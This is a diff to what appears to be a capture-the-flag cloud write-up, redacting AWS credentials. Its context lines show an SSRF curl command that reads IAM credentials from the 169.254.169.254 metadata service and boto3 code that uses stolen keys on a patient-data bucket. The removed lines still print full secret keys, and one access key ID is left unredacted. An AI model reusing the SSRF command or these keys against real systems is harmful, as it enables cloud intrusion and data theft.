@@ -65,7 +65,7 @@ curl -s "http://23.21.237.126/?url=http://169.254.169.254/latest/meta-data/iam/s
 
 **Retrieved Credentials:**
 - AccessKeyId: `ASIA5HCACCPUKE4B3UB6`
-- SecretAccessKey: `cf/jaudfJ7s26gC3D7RgaLxVRTRxqqmxm1GOX0QL`
+- SecretAccessKey: `SECRET_REDACTED_BY_ANTIGRAVITY`
 - SessionToken: [truncated for brevity]
 
 ### Step 2: Discover S3 Bucket Names
@@ -102,13 +102,13 @@ objects = s3.list_objects_v2(Bucket='ctf-25-medicloudx-credentials-l2808981')
 **Found IAM User Credentials:**
 
 1. **carlos.cardenas:**
-   - Access Key: `AKIA5HCACCPUM5JVDROJ`
-   - Secret Key: `nCcHPOtDk4j5DFnOqzqEy64UYuupX4tWCselUUZF`
+   - Access Key: `AKIA_REDACTED_BY_ANTIGRAVITY`
+   - Secret Key: `SECRET_REDACTED_BY_ANTIGRAVITY`
    - File: `employees/carlos.cardenas/carlos.cardenas.csv`
 
 2. **daniel.lopez:**
-   - Access Key: `AKIA5HCACCPUMNRPJAMJ`
-   - Secret Key: `2UvVFwdGhpJ+wSirma7re1HQRmNamTQlM5nI92ee`
+   - Access Key: `AKIA_REDACTED_BY_ANTIGRAVITY`
+   - Secret Key: `SECRET_REDACTED_BY_ANTIGRAVITY`
    - File: `employees/daniel.lopez/aws-credentials.csv`
 
 ### Step 4: Access Patient Data Bucket
@@ -119,8 +119,8 @@ Testing both sets of credentials:
 
 ```python
 session = boto3.Session(
-    aws_access_key_id='AKIA5HCACCPUMNRPJAMJ',
-    aws_secret_access_key='2UvVFwdGhpJ+wSirma7re1HQRmNamTQlM5nI92ee',
+    aws_access_key_id='AKIA_REDACTED_BY_ANTIGRAVITY',
+    aws_secret_access_key='SECRET_REDACTED_BY_ANTIGRAVITY',
     region_name='us-east-1'
 )
 
